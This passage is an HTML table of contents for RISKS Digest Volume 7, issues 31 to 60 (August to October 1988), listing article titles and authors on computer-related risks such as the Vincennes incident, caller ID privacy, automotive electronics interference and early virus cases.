<LI><A HREF="/Risks/7.31.html#subj8">  Disaster Exposition (Cliff Stoll)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.32.html">Volume 7 Issue 32 (9 Aug 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.32.html#subj1">  Privacy in computer age (no place to hide) (Sayed Banawan)</A>
<LI><A HREF="/Risks/7.32.html#subj2">  Follow-up to legal hypothetical (CEReuben)</A>
<LI><A HREF="/Risks/7.32.html#subj3">  Preliminary A320 Inquiry Results (Martin Harriman)</A>
<LI><A HREF="/Risks/7.32.html#subj4">  Computer terminals and dermatology (Steve Philipson)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.33.html">Volume 7 Issue 33 (10 Aug 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.33.html#subj1">  Cascaded Inference and the Vincennes affair (CFEEHRER)</A>
<LI><A HREF="/Risks/7.33.html#subj2">  "Virus" Bill (Joseph M. Beckman)</A>
<LI><A HREF="/Risks/7.33.html#subj3">  More RISKy ATM's (Dave Horsfall)</A>
<LI><A HREF="/Risks/7.33.html#subj4">  Keeping Autos and Drivers in Suspense (Joseph M. Beckman)</A>
<LI><A HREF="/Risks/7.33.html#subj5">  Airbus Cockpit Alarms (Fred Baube)</A>
<LI><A HREF="/Risks/7.33.html#subj6">  A-320 investigation (Steve Philipson)</A>
<LI><A HREF="/Risks/7.33.html#subj7">  Federal charges brought against accused teen-age hacker (Mike Linnig)</A>
<LI><A HREF="/Risks/7.33.html#subj8">  Orbit 100,000 self-guided "brilliant" weapons, Reagan advised (Jon Jacky)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.34.html">Volume 7 Issue 34 (12 Aug 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.34.html#subj1">  "Eye focusing found to be VDT hazard."  (Denis Haskin)</A>
<LI><A HREF="/Risks/7.34.html#subj2">  Privacy (Again) (Willis Ware)</A>
<LI><A HREF="/Risks/7.34.html#subj3">  "Virus" Bill (Jerome H. Saltzer, Steven C. Den Beste, Steve Kovner)</A>
<LI><A HREF="/Risks/7.34.html#subj4">  A Visit To the Clinic (Brian Ellis)</A>
<LI><A HREF="/Risks/7.34.html#subj5">  Aegis beaten by binoculars? (Trusting computers and/or people?)    (Andy Coupland via Martyn Thomas)
</A>
<LI><A HREF="/Risks/7.34.html#subj6">  Airbus (George Michaelson)</A>
<LI><A HREF="/Risks/7.34.html#subj7">  SDI rationalizations (Steve Summit)</A>
<LI><A HREF="/Risks/7.34.html#subj8">  Re: Misidentification of persons as criminal by computers (Haynes)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.35.html">Volume 7 Issue 35 (15 Aug 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.35.html#subj1">  Re: Privacy (difficulty of witholding "private" information) (Jon Jacky)</A>
<LI><A HREF="/Risks/7.35.html#subj2">  Re: Keeping Autos and Drivers in Suspense (Win Treese)</A>
<LI><A HREF="/Risks/7.35.html#subj3">  Re: Cascaded inference (G.L.Sicherman)</A>
<LI><A HREF="/Risks/7.35.html#subj4">  Re: "Eye focusing found to be VDT hazard."     (Brint Cooper, Anthony G. Atkielski, Jeremy Grodberg)
</A>
<LI><A HREF="/Risks/7.35.html#subj5">  Can current CAD/simulation methods handle long-term fatigue analysis?    (John R. Galloway)
</A>
<LI><A HREF="/Risks/7.35.html#subj6">  ATMs and PIN protection: twice silly victims in Boulder (Gary McClelland)</A>
<LI><A HREF="/Risks/7.35.html#subj7">  Re: Orbit 100,000 self-guided "brilliant" weapons ... (Amos Shapir)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.36.html">Volume 7 Issue 36 (17 Aug 88 )</A>
<DD><UL>
<LI><A HREF="/Risks/7.36.html#subj1">  Package-deal arguments about VDT's (Philip E. Agre)</A>
<LI><A HREF="/Risks/7.36.html#subj2">  Blue Cube new software problems (Randy Neff)</A>
<LI><A HREF="/Risks/7.36.html#subj3">  Zero-balance dunning letter (Jerome H. Saltzer)</A>
<LI><A HREF="/Risks/7.36.html#subj4">  Chicago Disaster Conference (Lee S. Ridgway)</A>
<LI><A HREF="/Risks/7.36.html#subj5">  Car Electronics sensitive for atmospheric interference (Martin Minow)</A>
<LI><A HREF="/Risks/7.36.html#subj6">  1 in 10 NATO software modules reported incorrect (Jon Jacky)</A>
<LI><A HREF="/Risks/7.36.html#subj7">  Mathematical Error Puts Deficit off by $1.2 billion (PGN)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.37.html">Volume 7 Issue 37 (19 Aug 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.37.html#subj1">  Virus insurance (Rodney Hoffman)</A>
<LI><A HREF="/Risks/7.37.html#subj2">  Blind faith in overly electronic locks (Leonard N. Foner)</A>
<LI><A HREF="/Risks/7.37.html#subj3">  Fewer Charges Now Require a Signature (Kian-Tat Lim)</A>
<LI><A HREF="/Risks/7.37.html#subj4">  Re: Danger of Sensitive Car Electronics (Hugh Davies)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.38.html">Volume 7 Issue 38 (22 Aug 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.38.html#subj1">  British vs American safety rules (Henry Spencer)</A>
<LI><A HREF="/Risks/7.38.html#subj2">  Another boundary case bug (Tom Lane)</A>
<LI><A HREF="/Risks/7.38.html#subj3">  Retired couple jolted by $5 million electric bill (David Sherman)</A>
<LI><A HREF="/Risks/7.38.html#subj4">  Hotel could get soaked in lawsuit? (Don Chiasson)</A>
<LI><A HREF="/Risks/7.38.html#subj5">  RISKS contributions (PGN)</A>
<LI><A HREF="/Risks/7.38.html#subj6">  Risks of CAD programs (Alan Kaminsky)</A>
<LI><A HREF="/Risks/7.38.html#subj7">  Can current CAD/simulation methods handle long-term fatigue analysis?    (Henry Spencer)
</A>
<LI><A HREF="/Risks/7.38.html#subj8">  Vincennes and Cascaded Inference (Carl Feehrer)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.39.html">Volume 7 Issue 39 (24 Aug 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.39.html#subj1">  Computers and Gambling (George Michaelson)</A>
<LI><A HREF="/Risks/7.39.html#subj2">  Car engines become target for hackers (George Michaelson)</A>
<LI><A HREF="/Risks/7.39.html#subj3">  Vincennes and Non-Computer Verification (David Collier-Brown)</A>
<LI><A HREF="/Risks/7.39.html#subj4">  Shades of War Games (Doug Mosher)</A>
<LI><A HREF="/Risks/7.39.html#subj5">  Emissions testing risk (Levy)</A>
<LI><A HREF="/Risks/7.39.html#subj6">  Re: British vs. American safety rules (Jon Jacky)</A>
<LI><A HREF="/Risks/7.39.html#subj7">  Re: Structural analysis programs (Stephen D. Crocker)</A>
<LI><A HREF="/Risks/7.39.html#subj8">  Re: Danger of Sensitive Car Electronics (Will Martin)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.40.html">Volume 7 Issue 40 (25 Aug 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.40.html#subj1">  Car engines become target for hackers (Jerome H. Saltzer)</A>
<LI><A HREF="/Risks/7.40.html#subj2">  Re: IL car emissions testing process and enforcement errors (Will Martin)</A>
<LI><A HREF="/Risks/7.40.html#subj3">  Re: Danger of Sensitive Car Electronics (Henry Schaffer)</A>
<LI><A HREF="/Risks/7.40.html#subj4">  Automobile computer modifications (George Tomasevich)</A>
<LI><A HREF="/Risks/7.40.html#subj5">  Statistical reliability estimation criticized (Jon Jacky)</A>
<LI><A HREF="/Risks/7.40.html#subj6">  Can current CAD/simulation methods handle long-term fatigue analysis?    (Gerry Kokodyniak)
</A>
<LI><A HREF="/Risks/7.40.html#subj7">  Boundary Cases (James Peterson, John Bruner)</A>
<LI><A HREF="/Risks/7.40.html#subj8">  Mother's maiden name == arbitrary password (Walter Smith)</A>
<LI><A HREF="/Risks/7.40.html#subj9">  Risks of EFT agreements (Doug Claar)</A>
<LI><A HREF="/Risks/7.40.html#subj10">  Chile con backbones (Joe McMahon via Martin Minow from VIRUS-L)</A>
<LI><A HREF="/Risks/7.40.html#subj11">  An item by Mark Garvin on SoftGuard and the Trojan horse "SUG" (from VIRUS-L)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.41.html">Volume 7 Issue 41 (31 Aug 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.41.html#subj1">  The Marconi Deaths (Brian Randell)</A>
<LI><A HREF="/Risks/7.41.html#subj2">  $300,000 Automatic Teller Theft (Sort Of)  (Henry Cox)</A>
<LI><A HREF="/Risks/7.41.html#subj3">  Car engines become target for hackers (Jeffrey Mogul)</A>
<LI><A HREF="/Risks/7.41.html#subj4">  Blinker failure in 87 Ford Mustang (Tim Thomas)</A>
<LI><A HREF="/Risks/7.41.html#subj5">  Risks of locking systems (Andrew Birner)</A>
<LI><A HREF="/Risks/7.41.html#subj6">  Electronic 1040s (Rodney Hoffman)</A>
<LI><A HREF="/Risks/7.41.html#subj7">  Water seepage stops Computer controlled monorail (George Michaelson)</A>
<LI><A HREF="/Risks/7.41.html#subj8">  Re: Fewer Charges Now Require a Signature (David Sherman)</A>
<LI><A HREF="/Risks/7.41.html#subj9">  Continental Bank Drops Retail Accounts (Patrick A. Townson)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.42.html">Volume 7 Issue 42 (1 Sep 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.42.html#subj1">  "Pizzamation" traces phone calls, matches addresses (Jon Jacky)</A>
<LI><A HREF="/Risks/7.42.html#subj2">  Skylab and Sunspot Activity (PGN)</A>
<LI><A HREF="/Risks/7.42.html#subj3">  Denial of Service in Wembley-on-the-Motown (Behrooz Parhami)</A>
<LI><A HREF="/Risks/7.42.html#subj4">  Re: Calculations with wrapped numbers (Mike Linnig)</A>
<LI><A HREF="/Risks/7.42.html#subj5">  Meter reading follies (Chris Jones)</A>
<LI><A HREF="/Risks/7.42.html#subj6">  Re: abnormal bills (Ted Lee)</A>
<LI><A HREF="/Risks/7.42.html#subj7">  Risks of CAD programs (Mike A. Gigante)</A>
<LI><A HREF="/Risks/7.42.html#subj8">  Re: Risks of CAD programs (Sam Crowley)</A>
<LI><A HREF="/Risks/7.42.html#subj9">  Can current CAD/simulation methods handle long-term fatigue analysis?    (Henry Spencer)
</A>
<LI><A HREF="/Risks/7.42.html#subj10">  Re: Vincennes and Non-Computer Verification (Henry Spencer)</A>
<LI><A HREF="/Risks/7.42.html#subj11">  Re: Computers and Gambling (Jim Frost)</A>
<LI><A HREF="/Risks/7.42.html#subj12">  Automatic Bank Procedures (David A. Honig)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.43.html">Volume 7 Issue 43 (2 Sep 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.43.html#subj1">  Statistical reliability estimation criticized (Brian Randell)</A>
<LI><A HREF="/Risks/7.43.html#subj2">  Calling party identification (Mark W. Eichin, TMPLee, anonymous)</A>
<LI><A HREF="/Risks/7.43.html#subj3">  Automotive EMI - a personal experience (Scott C. Crumpton)</A>
<LI><A HREF="/Risks/7.43.html#subj4">  The mental tyranny of a cash register (Steven C. Den Beste) </A>
<LI><A HREF="/Risks/7.43.html#subj5">  Intoximeter risks (Andrew Vaught)</A>
<LI><A HREF="/Risks/7.43.html#subj6">  SSNs, Passports (Chris Hibbert)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.44.html">Volume 7 Issue 44 (5 Sep 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.44.html#subj1">  Re: "Pizzamation" and Call Tracing     (Bob N. Mayo, Edwin Wiles, Patrick A. Townson)
</A>
<LI><A HREF="/Risks/7.44.html#subj2">  COMPASS REPORT in RISKS 7.40 (Bev Littlewood via Brian Randell)</A>
<LI><A HREF="/Risks/7.44.html#subj3">  Statistical reliability estimation (Lance J. Hoffman)</A>
<LI><A HREF="/Risks/7.44.html#subj4">  Re: Calculations with wrapped numbers (Bruce Karsh)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.45.html">Volume 7 Issue 45 (7 Sep 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.45.html#subj1">  Cheater software (Rodney Hoffman)</A>
<LI><A HREF="/Risks/7.45.html#subj2">  Re: COMPASS REPORT (Nancy Leveson)</A>
<LI><A HREF="/Risks/7.45.html#subj3">  Re: Risks Digest 7.44 (Jerome H. Saltzer)</A>
<LI><A HREF="/Risks/7.45.html#subj4">  Display of telephone numbers (Bruce O'Neel)</A>
<LI><A HREF="/Risks/7.45.html#subj5">  Telephones and privacy (C.H. Longmore)</A>
<LI><A HREF="/Risks/7.45.html#subj6">  Gambling with video arcade machines (Mike Blackwell)</A>
<LI><A HREF="/Risks/7.45.html#subj7">  Video Games (Ed Nilges)</A>
<LI><A HREF="/Risks/7.45.html#subj8">  Wembley-on-the-Motown (Jeffrey R. Kell)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.46.html">Volume 7 Issue 46 (7 Sep 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.46.html#subj1">  Airbus vs U.K. MOD development standards (Lorenzo Strigini)</A>
<LI><A HREF="/Risks/7.46.html#subj2">  Vincennes: Rules of engagement violated by AI heuristic? (Clifford Johnson)</A>
<LI><A HREF="/Risks/7.46.html#subj3">  Re: Statistical reliability estimation and "certification" (Jon Jacky)</A>
<LI><A HREF="/Risks/7.46.html#subj4">  A Computer Virus Case Goes to Trial (Joe Morris)</A>
<LI><A HREF="/Risks/7.46.html#subj5">  Computers and guns (Gary Sanders)</A>
<LI><A HREF="/Risks/7.46.html#subj6">  Automatic Call Tracing and 911 Emergency Numbers (Gary McClelland)</A>
<LI><A HREF="/Risks/7.46.html#subj7">  Automatic Number ID: Bad Idea! (Andrew Klossner)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.47.html">Volume 7 Issue 47 (8 Sep 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.47.html#subj1">  COMPASS report in RISKS 7.40 (Jean-Claude Laprie, Nancy Leveson)</A>
<LI><A HREF="/Risks/7.47.html#subj2">  Calling number delivery (ANI) (John (J.) McHarry)</A>
<LI><A HREF="/Risks/7.47.html#subj3">  More on Automatic Call Tracing and 911 Emergency Numbers    (Robin j. Herbison, Al Stangenberger
</A>
<LI><A HREF="/Risks/7.47.html#subj4">  Another ANI scam (Brent Laminack)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.48.html">Volume 7 Issue 48 (9 Sep 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.48.html#subj1">  COMPASS 88 (Bev Littlewood)</A>
<LI><A HREF="/Risks/7.48.html#subj2">  Safety Engineering (WHMurray)</A>
<LI><A HREF="/Risks/7.48.html#subj3">  Technical naivete revealed by responses to VINCENNES incident (Jon Jacky)</A>
<LI><A HREF="/Risks/7.48.html#subj4">  Vincennes: Rules of engagement violated by AI heuristic? (Clifford Johnson)</A>
<LI><A HREF="/Risks/7.48.html#subj5">  ANI Response (Patrick A. Townson)</A>
<LI><A HREF="/Risks/7.48.html#subj6">  Proposed ANI Enhancement (Rob Boudrie)</A>
<LI><A HREF="/Risks/7.48.html#subj7">  ANI blocking defeats purpose (Bob Philhower)</A>
<LI><A HREF="/Risks/7.48.html#subj8">  Credit Card Loss Woes (Clay Jackson)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.49.html">Volume 7 Issue 49 (11 Sep 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.49.html#subj1">  Firmware bugs in Dutch gambling machines (P. Knoppers)</A>
<LI><A HREF="/Risks/7.49.html#subj2">  Soviets See Little Hope of Controlling Spacecraft (Gary Kremen)</A>
<LI><A HREF="/Risks/7.49.html#subj3">  Disinterest in disaster not based on probability estimates (Clifford Johnson)</A>
<LI><A HREF="/Risks/7.49.html#subj4">  What a Ticonderoga Combat System "records" (John Allred)</A>
<LI><A HREF="/Risks/7.49.html#subj5">  High-tech toilets (Robert Dorsett)</A>
<LI><A HREF="/Risks/7.49.html#subj6">  ANI/911 Misconceptions (Dave Robbins)</A>
<LI><A HREF="/Risks/7.49.html#subj7">  Re: Display of telephone numbers on receiving party's phone (Henry Spencer)</A>
<LI><A HREF="/Risks/7.49.html#subj8">  Social content of computer games (Eric Postpischil, Henry Spencer)</A>
<LI><A HREF="/Risks/7.49.html#subj9">  "Viruses Don't Exist" and the Marconi Mysteries... (Mark Moore)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.50.html">Volume 7 Issue 50 (12 Sep 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.50.html#subj1">  Computer glitch costs AA $50M ..." (Ken Calvert)</A>
<LI><A HREF="/Risks/7.50.html#subj2">  Risks of Motel Computers (Brint Cooper)</A>
<LI><A HREF="/Risks/7.50.html#subj3">  IFF and the Vincennes (Geoff. Lane.)</A>
<LI><A HREF="/Risks/7.50.html#subj4">  "Single keystroke" (Philip E. Agre)</A>
<LI><A HREF="/Risks/7.50.html#subj5">  `Credit doctors' (Donn Seeley)</A>
<LI><A HREF="/Risks/7.50.html#subj6">  Scientific Safety (WHMurray)</A>
<LI><A HREF="/Risks/7.50.html#subj7">  Bev Littlewood's message in <A HREF="/Risks/7.48.html">RISKS-7.48</A> (PGN)</A>
<LI><A HREF="/Risks/7.50.html#subj8">  Calculations with Wrapped Numbers     (Mark Brader, Bennet Yee, Jan Wolitzky, Roger Goun)
</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.51.html">Volume 7 Issue 51 (13 Sep 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.51.html#subj1">  Single Character Errors (Geoff. Lane)</A>
<LI><A HREF="/Risks/7.51.html#subj2">  Soviet Mars Probe and single character errors (PGN)</A>
<LI><A HREF="/Risks/7.51.html#subj3">  Stanford Collider Shut Down (PGN)</A>
<LI><A HREF="/Risks/7.51.html#subj4">  Destructive remote controls (Jim Williams)</A>
<LI><A HREF="/Risks/7.51.html#subj5">  Re: computer follies (Michael Greim via Mark Brader)</A>
<LI><A HREF="/Risks/7.51.html#subj6">  IFF and the Vincennes (Dennis Brantly)</A>
<LI><A HREF="/Risks/7.51.html#subj7">  Re: Disinterest in disaster not based on probability estimates (Amos Shapir)</A>
<LI><A HREF="/Risks/7.51.html#subj8">  ``MS-DOS "virus" programs do not exist.'' (David Dyer-Bennet)</A>
<LI><A HREF="/Risks/7.51.html#subj9">  Hiding payoff slot (Peter da Silva)</A>
<LI><A HREF="/Risks/7.51.html#subj10">  Citation for "car engines become target for hackers" (karl)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.52.html">Volume 7 Issue 52 (14 Sep 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.52.html#subj1">  Tom Wicker column on computers, Vincennes and SDI (Gary Chapman)</A>
<LI><A HREF="/Risks/7.52.html#subj2">  Computer error in vote tallying (Gary Chapman)</A>
<LI><A HREF="/Risks/7.52.html#subj3">  Risks of Using Computers in Elections (PGN)</A>
<LI><A HREF="/Risks/7.52.html#subj4">  Soviet Space Probe (Dave Feldmeier)</A>
<LI><A HREF="/Risks/7.52.html#subj5">  Re: "Single keystroke" (Matthew P Wiener)</A>
<LI><A HREF="/Risks/7.52.html#subj6">  London Underground problem (Lindsay F. Marshall)</A>
<LI><A HREF="/Risks/7.52.html#subj7">  Re: Destructive Remote Controls (William Curtiss)</A>
<LI><A HREF="/Risks/7.52.html#subj8">  An ANI Compromise (Mike Linnig)</A>
<LI><A HREF="/Risks/7.52.html#subj9">  +++ RISKS Guidelines revisited +++ [&lt;&lt;&lt;PLEASE READ THIS.&gt;&gt;&gt;]</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.53.html">Volume 7 Issue 53 (15 Sep 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.53.html#subj1">  Hurricane Gilbert (Richard A. Schafer via Matthew P Wiener)</A>
<LI><A HREF="/Risks/7.53.html#subj2">  Phobos I details (Dave Fiske, Jack Goldberg)</A>
<LI><A HREF="/Risks/7.53.html#subj3">  Computers and Elections (Lance J. Hoffman)</A>
<LI><A HREF="/Risks/7.53.html#subj4">  The First "Virus" on Japanese PC (Yoshio Oyanagi)</A>
<LI><A HREF="/Risks/7.53.html#subj5">  Another one-key mishap (Larry Nathanson)</A>
<LI><A HREF="/Risks/7.53.html#subj6">  Re: "Single keystroke" (Warren R. Carithers, Paul Dubuc)</A>
<LI><A HREF="/Risks/7.53.html#subj7">  More computer follies -- how not to design a console (Seth Gordon)</A>
<LI><A HREF="/Risks/7.53.html#subj8">  GNU Emacs &amp; Security (A.Gaynor via Eliot Lear and Geoff Goodfellow)</A>
<LI><A HREF="/Risks/7.53.html#subj9">  Complex phones (Dave Fetrow)</A>
<LI><A HREF="/Risks/7.53.html#subj10">  ISDN/ANI - What one switch vendor told me (Allen L. Chesley)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.54.html">Volume 7 Issue 54 (16 Sep 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.54.html#subj1">  CerGro voice mail hacked (John Sheneman)</A>
<LI><A HREF="/Risks/7.54.html#subj2">  Re: Computer error in vote tallying (Andy Frake)</A>
<LI><A HREF="/Risks/7.54.html#subj3">  IEEE approval voting (Don Chiasson)</A>
<LI><A HREF="/Risks/7.54.html#subj4">  Reminder -- ROM is not necessarily nonalterable (Andrew Klossner)</A>
<LI><A HREF="/Risks/7.54.html#subj5">  Colwich Junction (Mark Brader)</A>
<LI><A HREF="/Risks/7.54.html#subj6">  Smoke Inhalation on Amtrak's "Crescent" (Mike Trout)</A>
<LI><A HREF="/Risks/7.54.html#subj7">  Computer assigned hotel rooms (Bruce Wampler)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.55.html">Volume 7 Issue 55 (17 Sep 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.55.html#subj1">  The Ethics of Conflict Simulation (Mike Trout)</A>
<LI><A HREF="/Risks/7.55.html#subj2">  Re: Social content of video games (Tim Wood)</A>
<LI><A HREF="/Risks/7.55.html#subj3">  Re: Credit Doctors (Dave Robbins)</A>
<LI><A HREF="/Risks/7.55.html#subj4">  Virus in ROM on commodore 64 (Jurjen N.E. Bos)</A>
<LI><A HREF="/Risks/7.55.html#subj5">  Re: Destructive remote controls (Henry Spencer, Jurjen N.E. Bos)</A>
<LI><A HREF="/Risks/7.55.html#subj6">  Another one-key mishap (Russ Nelson)</A>
<LI><A HREF="/Risks/7.55.html#subj7">  Call for Papers, Invitational Workshop on Data Integrity (Zella Ruthberg)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.56.html">Volume 7 Issue 56 (21 Sep 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.56.html#subj1">  Runaway mouse problem in popular commercial WP program (Jon Jacky)</A>
<LI><A HREF="/Risks/7.56.html#subj2">  Wrapping Britain round the Greenwich meridian (Jack Campin)</A>
<LI><A HREF="/Risks/7.56.html#subj3">  Crime and (indifferent) Punishment (Glen Matthews)</A>
<LI><A HREF="/Risks/7.56.html#subj4">  Software Mixup on Soyuz Spacecraft (Karl Lehenbauer)</A>
<LI><A HREF="/Risks/7.56.html#subj5">  RISKS of (Suspected) Crooks Running Dinosaur-DOS (Fred Baube)</A>
<LI><A HREF="/Risks/7.56.html#subj6">  Multiple reservations and single bills (Jacob Hugart via Markus Stumptner)</A>
<LI><A HREF="/Risks/7.56.html#subj7">  Complete info on the Phobos 1 (Kaj Wiik via Ritchey Ruff)</A>
<LI><A HREF="/Risks/7.56.html#subj8">  `Computer programmer convicted of creating "virus"' (Mike Linnig)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.57.html">Volume 7 Issue 57 (24 Sep 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.57.html#subj1">  Faulty locks delay prison opening (Henry Cox)</A>
<LI><A HREF="/Risks/7.57.html#subj2">  In the future, risks of purchasing handguns (Alan Kaminsky)</A>
<LI><A HREF="/Risks/7.57.html#subj3">  Olympian RISKS (Henry Cox)</A>
<LI><A HREF="/Risks/7.57.html#subj4">  [Another Willamette] Sewage Spill Linked to Computer (Nike Horton)</A>
<LI><A HREF="/Risks/7.57.html#subj5">  Keep backups, risk job (James F. Carter)</A>
<LI><A HREF="/Risks/7.57.html#subj6">  Computer failure shuts down several thousand telephones (Vince Manis)</A>
<LI><A HREF="/Risks/7.57.html#subj7">  LA Times photo of humorous credit card maybe not so funny (Michael Coleman)</A>
<LI><A HREF="/Risks/7.57.html#subj8">  Risks of Cellular Phones? (Chuck Weinstock)</A>
<LI><A HREF="/Risks/7.57.html#subj9">  Auto Computer Risks (Chuck Weinstock)</A>
<LI><A HREF="/Risks/7.57.html#subj10">  Volvo's and Electromagnetic Interference (Bill Welch)</A>
<LI><A HREF="/Risks/7.57.html#subj11">  Scientific Safety (B.Littlewood)</A>
<LI><A HREF="/Risks/7.57.html#subj12">  Computer Defaults (The Mental Tyrrany of Cash Registers) (Stephen Rickaby)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.58.html">Volume 7 Issue 58 (26 Sep 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.58.html#subj1">  Computers in local govt - a burning issue? (Dave Horsfall)</A>
<LI><A HREF="/Risks/7.58.html#subj2">  North Cornwall water supply polluted (Paul Mansbacher via Willie Smith)</A>
<LI><A HREF="/Risks/7.58.html#subj3">  Re: Risks of cellular telephones (Alan Kaminsky, John Gilmore)</A>
<LI><A HREF="/Risks/7.58.html#subj4">  Other voice mailbox risks reported (Bahn)</A>
<LI><A HREF="/Risks/7.58.html#subj5">  Auto Computers vs. radios (Steve Jay)</A>
<LI><A HREF="/Risks/7.58.html#subj6">  State Records via Computer (William Curtiss)</A>
<LI><A HREF="/Risks/7.58.html#subj7">  Damage by Disney 3-D glasses (Andrew Klossner)</A>
<LI><A HREF="/Risks/7.58.html#subj8">  Re: more on killer remote controlls (Greeny)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.59.html">Volume 7 Issue 59 (29 Sep 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.59.html#subj1">  Arthur Miller, Assault on Privacy: Computers, Data Banks and Dossiers    (Barry C. Nelson)
</A>
<LI><A HREF="/Risks/7.59.html#subj2">  EPROM is not necessarily programmed for life (Mike Linnig)</A>
<LI><A HREF="/Risks/7.59.html#subj3">  The Wobbly Goblin (a.k.a. Stealth fighter) (Alan Kaminsky)</A>
<LI><A HREF="/Risks/7.59.html#subj4">  Re: Stanford Collider Shut Down (Matthew P Wiener)</A>
<LI><A HREF="/Risks/7.59.html#subj5">  Re: Is Uncle Sam selling your name to mailing lists?    (Greg Pflaum via Mark Brader)
</A>
<LI><A HREF="/Risks/7.59.html#subj6">  CPSR 1988 Annual Meeting (Gary Chapman)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.60.html">Volume 7 Issue 60 (3 Oct 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.60.html#subj1">  Diving Computers (Brian Randell)</A>
<LI><A HREF="/Risks/7.60.html#subj2">  The Perils of PCs in Public (Dave Horsfall)</A>
<LI><A HREF="/Risks/7.60.html#subj3">  A New Portal for the Offensive -- FAX ATTACKS (Scott Rose)</A>
<LI><A HREF="/Risks/7.60.html#subj4">  Is Uncle Sam selling your name? -- Maybe not. (Mark Brader)</A>
<LI><A HREF="/Risks/7.60.html#subj5">  Re: Is UMASS selling your name to mailing lists? (Andrew Klossner)</A>
<LI><A HREF="/Risks/7.60.html#subj6">  Write your credit card number on a business reply card? (David Sherman)</A>
<LI><A HREF="/Risks/7.60.html#subj7">  Killer terminals     (Michael Fischbein, Bill Witts, both via Mark Brader from comp.misc)
</A>
